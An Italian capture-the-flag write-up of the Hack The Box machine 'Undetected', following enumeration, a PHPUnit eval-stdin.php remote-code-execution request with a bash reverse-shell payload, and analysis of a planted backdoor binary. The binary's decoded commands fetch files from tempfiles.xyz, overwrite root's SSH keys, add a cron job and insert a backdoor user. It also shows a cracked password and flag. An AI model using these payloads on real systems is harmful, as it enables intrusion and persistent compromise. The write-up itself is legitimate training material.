#+title: HTB - Undetected (Medium)
#+author: Andrea Pepe
#+date: 02/07/2022

* Foothold
** nmap
#+begin_example
$ nmap -sC -sV undetected                                                               1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 07:14 CEST
Nmap scan report for undetected (10.10.11.146)
Host is up (0.049s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey: 
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Diana's Jewelry
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds
#+end_example

#+begin_example
$ nmap -p- undetected
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 07:14 CEST
Nmap scan report for undetected (10.10.11.146)
Host is up (0.045s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 133.22 seconds
#+end_example



** Web Server
Sembra essere una pagina web di una gioielleria
(Diana's Jewelry). Non sembra esserci nulla di
troppo interessante, a parte il fatto che,
cliccando sul pulsante per visitare lo store, si
viene ridinezionati al dominio *store.djewelry.htb*.

Inseriamolo in ~/etc/hosts~ per vedere dove ci
porta.

E' effettivamente visibile un sito dello store in
cui è possibile aggiungere oggetti al carrello e
fare il login. Tuttavia, la pagina di login sembra
essere non funzionante, in quanto viene detto che:
#+begin_example
NOTICE
Due to a website migration we are currently not taking any online orders.
Contact us if you wish to make a purchase
#+end_example

Tra le altre informazioni interessanti che si
possono raccogliere, c'è un indirizzo mail a fine
pagina web:
*contact@djewelry.htb*

*** gobuster
#+begin_example
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://store.djewelry.htb 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.djewelry.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/02 15:15:29 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/images/]
/js                   (Status: 301) [Size: 321] [--> http://store.djewelry.htb/js/]    
/css                  (Status: 301) [Size: 322] [--> http://store.djewelry.htb/css/]   
/fonts                (Status: 301) [Size: 324] [--> http://store.djewelry.htb/fonts/] 
/vendor               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/vendor/]
/server-status        (Status: 403) [Size: 283] 
#+end_example

Troviamo la cartella */vendor* esposta dal web server.
Cercando su internet, si scopre che esiste una
vulnerabilità causata da ciò, che, tramite il file
*eval-stdin.php*, permette di ottenere una *RCE
(Remote Code Execution)*.

La si sfrutta, ottenendo una *reverse-shell*,
mettendosi in ascolot sulla porta 4321 ed
effettuando la seguente richiesta
HTTP (POST):
#+begin_example
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: store.djewelry.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 81

<?=shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.115/4321 0>&1'cl");?>
#+end_example

* Privilege Escalation
** shell-upgrade
#+begin_example
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo && fg
export TERM=xterm-256color
#+end_example
** www-data
Ottenuta la shell come utente *www-data*, si tenta
di diventare utente normale.
Questo è il contenuto di *etc/passwd*:
#+begin_example
www-data@production:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
steven1:x:1000:1000:,,,:/home/steven:/bin/bash
#+end_example

Notare che ci sono due utenti *steven* e *steven1* che
puntano alla stessa home.
Vediamo se riusciamo a trovare qualche
informazione utile per poter entrare come uno dei
due utenti.

*** file posseduti da www-data (tranne quelli in /var/www)
#+begin_example
www-data@production:/$ find / -user www-data -ls 2>/dev/null | grep -v "var/w"
        3      0 crw--w----   1 www-data tty      136,   0 Jul  2 13:33 /dev/pts/0
    15193      4 drwxr-xr-x   2 www-data www-data     4096 Feb  8 19:59 /var/cache/apache2/mod_cache_disk
    17565     28 -r-x------   1 www-data www-data    27296 May 14  2021 /var/backups/info
    44468      0 dr-xr-xr-x   9 www-data www-data        0 Jul  2 13:31 /proc/1408
    70059      0 dr-xr-xr-x   3 www-data www-data        0 Jul  2 13:31 /proc/1408/task
    70111      0 dr-xr-xr-x   7 www-data www-data        0 Jul  2 13:31 /proc/1408/task/1408
...
#+end_example

Vediamo che un file interessante sembra essere
*/var/backups/info*.

*** /var/backups/info
#+begin_example
www-data@production:/var/backups$ file info
info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped
#+end_example

Si tratta di un eseguibile in formato ELF a 64
bit. Tuttavia, provandolo ad eseguire, sembra non
funzionare. Aprendo un server sulla macchina
target e connettendomi dalla macchina Kali, porto
il file in locale, per poter utilizzare il comando
*strings*, non presente sulla macchina target.

#+begin_example
$ strings info        
/lib64/ld-linux-x86-64.so.2
tv5n
^X<h
klogctl
socket
exit
htons
perror
puts
fork
tolower
mmap
sched_setaffinity
strlen
unshare
memset
bind
getpagesize
vsnprintf
strtoul
setsockopt
getgid
stderr
system
getuid
execve
if_nametoindex
close
open
fprintf
sendto
sleep
__cxa_finalize
memmem
__libc_start_main
write
libc.so.6
GLIBC_2.3.4
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
[-] setsockopt(PACKET_VERSION)
[-] setsockopt(PACKET_RX_RING)
[-] socket(AF_PACKET)
[-] bind(AF_PACKET)
[-] sendto(SOCK_RAW)
[-] socket(SOCK_RAW)
[-] socket(SOCK_DGRAM)
[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)
[-] klogctl(SYSLOG_ACTION_READ_ALL)
Freeing SMP
[-] substring '%s' not found in dmesg
ffff
/bin/bash
776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b
[-] fork()
/etc/shadow
[.] checking if we got root
[-] something went wrong =(
[+] got r00t ^_^
[-] unshare(CLONE_NEWUSER)
deny
/proc/self/setgroups
[-] write_file(/proc/self/set_groups)
0 %d 1
/proc/self/uid_map
[-] write_file(/proc/self/uid_map)
/proc/self/gid_map
[-] write_file(/proc/self/gid_map)
[-] sched_setaffinity()
/sbin/ifconfig lo up
[-] system(/sbin/ifconfig lo up)
[.] starting
[.] namespace sandbox set up
[.] KASLR bypass enabled, getting kernel addr
[.] done, kernel text:   %lx
[.] commit_creds:        %lx
[.] prepare_kernel_cred: %lx
[.] native_write_cr4:    %lx
[.] padding heap
[.] done, heap is padded
[.] SMEP & SMAP bypass enabled, turning them off
[.] done, SMEP & SMAP should be off now
[.] executing get root payload %p
[.] done, should be root now
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
kern.c
hexdigit2int
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
packet_socket_setup
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
vsnprintf@GLIBC_2.2.5
setsockopt@GLIBC_2.2.5
fork_shell
unshare@GLIBC_2.4
packet_sock_kmalloc
write@GLIBC_2.2.5
_edata
strlen@GLIBC_2.2.5
getuid@GLIBC_2.2.5
mmap@GLIBC_2.2.5
system@GLIBC_2.2.5
htons@GLIBC_2.2.5
write_file
memset@GLIBC_2.2.5
oob_setup
sendto@GLIBC_2.2.5
get_root_payload
close@GLIBC_2.2.5
sched_setaffinity@GLIBC_2.3.4
__libc_start_main@GLIBC_2.2.5
oob_timer_execute
execve@GLIBC_2.2.5
packet_socket_rx_ring_init
check_root
__data_start
fprintf@GLIBC_2.2.5
__gmon_start__
if_nametoindex@GLIBC_2.2.5
memmem@GLIBC_2.2.5
__dso_handle
_IO_stdin_used
packet_sock_timer_schedule
getgid@GLIBC_2.2.5
tolower@GLIBC_2.2.5
kmalloc_pad
__libc_csu_init
klogctl@GLIBC_2.2.5
packet_socket_send
__bss_start
get_kernel_addr
main
loopback_send
bind@GLIBC_2.2.5
exec_shell
open@GLIBC_2.2.5
oob_write
perror@GLIBC_2.2.5
strtoul@GLIBC_2.2.5
setup_sandbox
is_root
oob_id_match_execute
getpagesize@GLIBC_2.2.5
exit@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
KERNEL_BASE
packet_sock_id_match_trigger
sleep@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
fork@GLIBC_2.2.5
stderr@GLIBC_2.2.5
pagealloc_pad
socket@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
#+end_example

L'unica stringa interessante sembra essere quella
codificata. Sembra che sia una stringa
esadecimale, proviamo a convertirla in testo.

#+begin_example
$ echo "776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b" | xxd -r -p
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys;
wget tempfiles.xyz/.main -O /var/lib/.main; 
chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab;
awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd;
awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd;
while read -r user group home shell _; 
do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; 
done < users.txt; 
rm users.txt;
#+end_example

Il risultato è molto interessante: sembra essere
una serie di comandi per inserire l'utente *steven1*
(c'è il carattere 1 che viene appeso dopo $1) sia
in /etc/shadow che in /etc/passwd. C'è quindi
l'hash della password dell'utente. Ripuliamola dai
caratteri di escape e mettiamola in un file a
parte, chiamato *shadow.txt* per utilizzarlo per il
cracking. Inoltre, premettiamogli il nome
dell'utente e i due punti, costruendo proprio come
vengono salvate nel file */etc/shadow*.

#+begin_example
steven1:$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7:::
#+end_example

Analogamente, generiamo un file chiamato
*passwd.txt* che conterrà il contenuto di
/etc/passwd per l'utente steven1.
#+begin_example
steven1:x:1000:1000:,,,:/home/steven:/bin/bash
#+end_example

Facciamone l'unshadowing in un file
*unshadowed.txt*, che useremo per il cracking.
#+begin_example
unshadow passwd.txt shadow.txt > unshadowed.txt
#+end_example

#+begin_example
cat unshadowed.txt

steven1:$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:1000:1000:,,,:/home/steven:/bin/bash
#+end_example

*** john the ripper
Proseguiamo a crackare la password usando ~John The
Ripper~.
#+begin_example
$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihatehackers     (steven1)     
1g 0:00:00:17 DONE (2022-07-02 15:51) 0.05875g/s 5234p/s 5234c/s 5234C/s littlebrat..halo03
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
#+end_example

Abbiamo quindi le seguenti credenziali.

*steven1:ihatehackers*.

** steven1
*** user flag
#+begin_example
steven@production:~$ cat user.txt
51b60a65eaf681d879443170c43fb437
#+end_example

*** ssh
Si nota che è possibile con la password trovata
accedere tramite ssh con l'utente *steven1*, ma *NON*
con l'utente *steven*.
*** /var/mail
C'era una mail per steven che ora possiamo
leggere:
#+begin_example
steven@production:/var/mail$ cat steven
 
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
	by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
	for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
	by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
	Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
#+end_example
